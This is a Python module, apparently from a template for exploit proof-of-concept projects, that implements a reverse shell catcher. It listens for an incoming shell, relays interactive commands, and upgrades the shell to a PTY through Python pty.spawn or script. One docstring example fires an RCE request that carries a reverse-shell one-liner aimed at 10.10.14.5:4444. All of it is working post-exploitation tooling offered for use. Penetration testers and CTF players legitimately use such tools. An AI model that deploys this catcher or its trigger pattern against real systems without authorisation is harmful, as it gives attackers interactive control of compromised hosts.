"""
Shell catcher utility for POCs.
Catch reverse shells directly in your exploit script.
"""

import socket
import threading
import select
import sys
import time
import readline  # For command history
import os
import termios
import tty
from {{cookiecutter.project_slug}}.utils.output import out


class ShellCatcher:
    """
    Simple reverse shell catcher for POCs.

    Example:
        from utils.shell_catcher import ShellCatcher

        # Start listener in background
        catcher = ShellCatcher(4444)
        catcher.start()

        # Trigger your exploit here
        exploit_target()

        # Wait for shell and interact
        if catcher.wait_for_shell(timeout=10):
            catcher.interact()
    """

    def __init__(self, port, host='0.0.0.0'):
        self.host = host
        self.port = port
        self.listener = None
        self.client = None
        self.thread = None
        self.shell_caught = False
        self.stabilized = False

    def start(self):
        """Start listener in background thread"""
        self.thread = threading.Thread(target=self._listen, daemon=True)
        self.thread.start()
        out.info(f"Shell catcher listening on {self.host}:{self.port}")

    def _listen(self):
        """Background listener thread"""
        try:
            self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener.bind((self.host, self.port))
            self.listener.listen(1)

            self.client, addr = self.listener.accept()
            out.success(f"Shell caught from {addr[0]}:{addr[1]}")
            self.shell_caught = True

        except Exception as e:
            out.error(f"Listener error: {e}")

    def wait_for_shell(self, timeout=30):
        """Wait for shell to connect"""
        out.status(f"Waiting for shell (timeout: {timeout}s)...")
        start = time.time()

        while time.time() - start < timeout:
            if self.shell_caught:
                return True
            time.sleep(0.5)

        out.error("Timeout waiting for shell")
        return False

    def interact(self, use_raw=None):
        """Interact with caught shell"""
        if not self.client:
            out.error("No shell connected")
            return

        # Auto-enable raw mode if shell is stabilized (unless explicitly set)
        if use_raw is None:
            use_raw = self.stabilized

        out.success("Entering interactive shell (Ctrl+C to exit)")
        if not self.stabilized:
            out.info("Tip: Run catcher.stabilize() first for better shell")
        elif use_raw:
            out.info("Raw TTY mode enabled - full interactivity!")
        print()

        # Save terminal settings
        if use_raw and sys.stdin.isatty():
            old_tty = termios.tcgetattr(sys.stdin)
            try:
                tty.setraw(sys.stdin.fileno())
                self._raw_interact()
            finally:
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
        else:
            self._normal_interact()

    def _normal_interact(self):
        """Normal interaction with readline support"""
        try:
            # Enable readline for history
            readline.parse_and_bind('tab: complete')
            readline.parse_and_bind('set editing-mode emacs')

            while True:
                # Check if data available from shell
                ready = select.select([self.client, sys.stdin], [], [], 0.1)

                # Data from shell
                if self.client in ready[0]:
                    data = self.client.recv(4096)
                    if not data:
                        break
                    sys.stdout.write(data.decode('utf-8', errors='replace'))
                    sys.stdout.flush()

                # Input from user
                if sys.stdin in ready[0]:
                    cmd = sys.stdin.readline()
                    self.client.send(cmd.encode())

        except KeyboardInterrupt:
            out.warning("\nExiting shell")
        except Exception as e:
            out.error(f"Shell error: {e}")
        finally:
            self.cleanup()

    def _raw_interact(self):
        """Raw mode interaction (better for PTY shells)"""
        try:
            while True:
                ready = select.select([self.client, sys.stdin], [], [], 0.1)

                if self.client in ready[0]:
                    data = self.client.recv(4096)
                    if not data:
                        break
                    os.write(sys.stdout.fileno(), data)

                if sys.stdin in ready[0]:
                    data = os.read(sys.stdin.fileno(), 4096)
                    if not data:
                        break
                    self.client.send(data)

        except KeyboardInterrupt:
            pass
        finally:
            self.cleanup()

    def send_command(self, cmd, wait_response=True, timeout=2):
        """Send a single command and optionally get response"""
        if not self.client:
            return None

        self.client.send(f"{cmd}\n".encode())

        if wait_response:
            # Collect output for timeout seconds
            output = b""
            start = time.time()

            while time.time() - start < timeout:
                ready = select.select([self.client], [], [], 0.1)
                if self.client in ready[0]:
                    chunk = self.client.recv(4096)
                    if not chunk:
                        break
                    output += chunk

            return output.decode('utf-8', errors='replace')
        return None

    def stabilize(self):
        """Try to stabilize/upgrade the shell"""
        if not self.client:
            out.error("No shell connected")
            return False

        out.info("Attempting shell stabilization...")

        # Try Python PTY spawn
        out.status("Trying Python PTY upgrade...")
        response = self.send_command("which python python2 python3", timeout=1)

        if "python" in response.lower():
            # Find which python is available
            if "python3" in response:
                py = "python3"
            elif "python2" in response:
                py = "python2"
            else:
                py = "python"

            self.send_command(f"{py} -c 'import pty;pty.spawn(\"/bin/bash\")'")
            time.sleep(0.5)

            # Set terminal settings
            self.send_command("export TERM=xterm-256color")
            self.send_command("export SHELL=/bin/bash")

            # Get local terminal size and apply to remote
            try:
                import shutil
                cols, rows = shutil.get_terminal_size()
                self.send_command(f"stty rows {rows} cols {cols}")
                out.info(f"Terminal size set to {rows}x{cols}")
            except:
                out.warning("Could not detect terminal size - use: stty rows <rows> cols <cols>")

            out.success("Shell upgraded to PTY")
            self.stabilized = True
            return True

        # Try script command if python not available
        out.status("Python not found, trying script command...")
        response = self.send_command("which script", timeout=1)
        if "script" in response.lower():
            self.send_command("script -q /dev/null")
            time.sleep(0.5)
            self.send_command("export TERM=xterm-256color")

            # Set terminal size for script-based TTY too
            try:
                import shutil
                cols, rows = shutil.get_terminal_size()
                self.send_command(f"stty rows {rows} cols {cols}")
                out.info(f"Terminal size set to {rows}x{cols}")
            except:
                pass

            out.success("Shell upgraded using script")
            self.stabilized = True
            return True

        out.warning("Could not upgrade shell (no python/script found)")
        return False

    def cleanup(self):
        """Clean up connections"""
        if self.client:
            self.client.close()
        if self.listener:
            self.listener.close()


def quick_catch(port=4444, trigger_func=None, trigger_delay=1):
    """
    Quick helper to catch a shell with optional trigger function.

    Example:
        def trigger():
            requests.get(f"http://target/rce?cmd={python_oneliner('10.10.14.5', 4444)}")

        quick_catch(4444, trigger_func=trigger)
    """
    catcher = ShellCatcher(port)
    catcher.start()

    if trigger_func:
        out.status(f"Waiting {trigger_delay}s before triggering exploit...")
        time.sleep(trigger_delay)
        out.info("Triggering exploit...")
        trigger_func()

    if catcher.wait_for_shell():
        catcher.interact()
    else:
        out.error("Failed to catch shell")

    return catcher


def auto_shell(port=4444, wait_timeout=30):
    """
    Context manager for shell catching with auto-wait.

    Example:
        with auto_shell(4444) as catcher:
            # Trigger exploit
            exploit_target()

            # Automatically waits for shell
            if catcher.shell_caught:
                catcher.send_command("id")
                catcher.interact()
    """
    class ShellContext:
        def __init__(self, port, timeout):
            self.catcher = ShellCatcher(port)
            self.timeout = timeout
            self._waited = False  # Track if we've already waited

        def __enter__(self):
            self.catcher.start()
            return self

        def __exit__(self, *args):
            self.catcher.cleanup()

        def wait_and_interact(self):
            """Wait for shell and automatically enter interactive mode"""
            if self.catcher.wait_for_shell(timeout=self.timeout):
                self.catcher.interact()
                return True
            return False

        def send_command(self, cmd, wait_response=True, timeout=2):
            """Proxy to catcher's send_command"""
            return self.catcher.send_command(cmd, wait_response, timeout)

        def interact(self):
            """Proxy to catcher's interact"""
            return self.catcher.interact()

        def stabilize(self):
            """Proxy to catcher's stabilize"""
            return self.catcher.stabilize()

        @property
        def shell_caught(self):
            """Check if shell is caught, with auto-wait"""
            if not self.catcher.shell_caught and not self._waited:
                # Wait for shell if not caught yet (only once)
                self._waited = True
                self.catcher.wait_for_shell(timeout=self.timeout)
            return self.catcher.shell_caught

    return ShellContext(port, wait_timeout)